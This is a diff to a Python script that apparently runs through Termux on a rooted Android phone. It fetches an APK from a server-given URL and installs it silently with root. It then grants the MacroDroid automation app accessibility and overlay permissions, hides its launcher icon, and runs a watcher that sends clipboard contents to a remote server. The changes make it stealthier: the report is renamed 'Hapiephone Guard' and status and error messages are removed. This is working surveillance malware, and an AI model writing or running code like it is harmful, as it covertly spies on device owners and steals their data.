@@ -5,6 +5,7 @@ import requests
 import os
 import re
 
+# --- CONFIGURAÇÕES INICIAIS ---
 if len(sys.argv) < 4:
     print(f"❌ [FATAL ERROR] Insufficient arguments to start! Received: {sys.argv}", flush=True)
     sys.exit(1)
@@ -18,6 +19,7 @@ HEADERS = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
 APP_PACKAGE = "com.arlosoft.macrodroid"
 SETUP_DONE = False
 
+# Garante que o Termux não durma
 subprocess.run("termux-wake-lock", shell=True, check=False)
 
 def is_app_installed():
@@ -28,13 +30,26 @@ def is_app_installed():
         return False
 
 def setup_macrodroid():
-    print("⚙️ [SETUP] Configuring permissions and cloaking the app...", flush=True)
+    """
+    Configura permissões de sistema e ativa ambos os serviços de acessibilidade
+    necessários para o funcionamento total do MacroDroid via Root.
+    """
+    print("⚙️ [SETUP] Configurando permissões e ocultando o app...", flush=True)
+    
+    # Paths dos serviços de acessibilidade
+    service_main = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.MacroDroidAccessibilityService"
+    service_ui = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.triggers.services.UIInteractionService"
+    
+    # Junta os serviços com ':' para ativação múltipla
+    all_services = f"{service_main}:{service_ui}"
+
     commands = [
         'su -c "pm grant com.arlosoft.macrodroid android.permission.WRITE_EXTERNAL_STORAGE"',
         'su -c "pm grant com.arlosoft.macrodroid android.permission.READ_EXTERNAL_STORAGE"',
         'su -c "appops set com.arlosoft.macrodroid SYSTEM_ALERT_WINDOW allow"',
         'su -c "dumpsys deviceidle whitelist +com.arlosoft.macrodroid"',
-        'su -c "settings put secure enabled_accessibility_services com.arlosoft.macrodroid/com.arlosoft.macrodroid.MacroDroidAccessibilityService"',
+        # Ativa os dois serviços de acessibilidade de uma vez
+        f'su -c "settings put secure enabled_accessibility_services {all_services}"',
         'su -c "settings put secure accessibility_enabled 1"'
     ]
     
@@ -42,6 +57,7 @@ def setup_macrodroid():
         subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
         time.sleep(0.2)
         
+    # Tenta ocultar o ícone desativando a Activity principal
     try:
         res = subprocess.check_output('su -c "cmd package resolve-activity --brief com.arlosoft.macrodroid | tail -n 1"', shell=True, text=True).strip()
         if "com.arlosoft.macrodroid/" in res:
@@ -49,6 +65,7 @@ def setup_macrodroid():
     except Exception:
         pass
 
+    # Fallbacks de segurança para garantir que o ícone suma no launcher
     fallbacks = [
         "com.arlosoft.macrodroid.LauncherActivity",
         "com.arlosoft.macrodroid.MainActivity",
@@ -58,7 +75,7 @@ def setup_macrodroid():
     for act in fallbacks:
         subprocess.run(f'su -c "pm disable com.arlosoft.macrodroid/{act}"', shell=True, stderr=subprocess.DEVNULL)
 
-    print("✅ [SETUP] Permissions granted and icon successfully hidden!", flush=True)
+    print("✅ [SETUP] Permissões e Acessibilidade (Dupla) configuradas!", flush=True)
 
 def download_and_install(url):
     apk_path = "/sdcard/sys_app_temp.apk"
@@ -88,15 +105,12 @@ def download_and_install(url):
         print(f"📦 [DOWNLOAD] File saved. Size: {size_mb:.2f} MB", flush=True)
         
         if size_mb < 2.0:
-            print("⚠️ [WARNING] File is too small (0MB or HTML error). Download blocked.", flush=True)
-            print("🛑 [ABORT] Canceling installation to prevent system crash.", flush=True)
+            print("⚠️ [WARNING] File is too small. Download blocked.", flush=True)
             os.remove(apk_path)
             return False
 
         print("⚙️ [INSTALL] Starting silent installation...", flush=True)
         res = subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
-        
-        print(f"🛠️ [INSTALL LOG] Output: {res.stdout.strip()} | Error: {res.stderr.strip()}", flush=True)
         
         if os.path.exists(apk_path):
             os.remove(apk_path)
@@ -123,11 +137,6 @@ def check_authorization():
     try:
         installed = is_app_installed()
         
-        if not installed:
-            print("⚠️ [SYSTEM APP] MacroDroid not found on device. Requesting link...", flush=True)
-        else:
-            print("✅ [SYSTEM APP] MacroDroid is already installed.", flush=True)
-
         payload = {
             "ping": True,
             "device_id": DEVICE_ID,
@@ -136,7 +145,7 @@ def check_authorization():
             "app_system": not installed,
             "report": {
                 "system_info": {
-                    "model": "AutoCopy Ping",
+                    "model": "Hapiephone Guard",
                     "root_access": True,
                     "device_id": DEVICE_ID
                 }
@@ -149,16 +158,10 @@ def check_authorization():
             
             if not installed:
                 if "system_apk_url" in data:
-                    print("📥 [DOWNLOAD] Downloading APK...", flush=True)
                     if download_and_install(data["system_apk_url"]):
-                        print("🚀 [SUCCESS] Silent installation completed!", flush=True)
                         setup_macrodroid()
                         SETUP_DONE = True
                         installed = True
-                    else:
-                        print("❌ [ERROR] Failed to install APK.", flush=True)
-                else:
-                    print("❌ [SERVER ERROR] Server did NOT send the app link (system_apk_url)!", flush=True)
             else:
                 if not SETUP_DONE:
                     setup_macrodroid()
@@ -166,12 +169,11 @@ def check_authorization():
                     
             return data.get("status") == "active" and installed
         return False
-    except Exception as e:
-        print(f"❌ [CONNECTION ERROR] {e}", flush=True)
+    except Exception:
         return False
 
 def start_vigilante():
-    print(f"👁️ [WATCHER] Activated for Guild: {GUILD_ID}. Waiting for texts...", flush=True)
+    print(f"👁️ [WATCHER] Monitorando Guild: {GUILD_ID}...", flush=True)
     last_clip = force_focus_and_read()
     
     subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
@@ -186,7 +188,6 @@ def start_vigilante():
             
             if current and current != last_clip:
                 if not is_app_installed():
-                    print("🛑 [WATCHER] MacroDroid was uninstalled! Stopping operation.", flush=True)
                     process.terminate()
                     return
 
@@ -202,7 +203,6 @@ def start_vigilante():
                     if res.status_code == 200:
                         data = res.json()
                         if data.get("status") == "shutdown":
-                            print("🛑 [SHUTDOWN] Permission revoked by server.", flush=True)
                             process.terminate()
                             return
                             
@@ -215,12 +215,12 @@ def start_vigilante():
             process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
 def main():
-    print("📡 Starting system with Smart Ping...", flush=True)
+    print("📡 Hapiephone System Online...", flush=True)
     while True:
         if check_authorization():
             start_vigilante()
         else:
-            print("😴 [WAITING] Rechecking in 5 min...", flush=True)
+            print("😴 [WAITING] Re-autorizando em 5 min...", flush=True)
             time.sleep(300) 
 
 if __name__ == "__main__":
